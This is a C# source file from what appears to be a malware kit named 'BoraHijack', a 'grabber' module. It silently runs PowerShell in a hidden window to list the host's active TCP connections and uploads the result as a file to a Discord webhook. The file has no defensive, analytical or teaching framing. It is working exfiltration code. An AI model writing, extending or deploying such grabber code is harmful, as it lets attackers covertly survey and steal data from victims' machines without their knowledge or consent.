using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Discord.Webhook;
using Discord;
using System.Diagnostics;
#pragma warning disable CS0028

namespace BoraHijack.Grabbers
{
    class TCPConnections
    {
        public static async Task MainTCP(string webhookUrl)
        {
            string netstatOutput = GetTCPConnections();

            // Convert to memory stream
            var ms = new MemoryStream();
            var writer = new StreamWriter(ms);
            writer.Write(netstatOutput);
            writer.Flush();
            ms.Position = 0;

            var client = new DiscordWebhookClient(webhookUrl);
            await client.SendFileAsync(
                ms,
                filename: "NetTCPConnections.txt",
                text: "Active TCP Connections",
                isTTS: false,
                embeds: null,
                username: "BoraHijack",
                avatarUrl: "https://files.catbox.moe/zteeqk.png"
            );
        }

        static string GetTCPConnections()
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "Get-NetTCPConnection | Sort-Object State, LocalPort | Format-Table -AutoSize | Out-String",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            // prevents resource leaks
            using (var process = Process.Start(psi))
            {
                if (process == null)
                    return "Failed to start PowerShell";

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return output;
            }
        }
    }
}
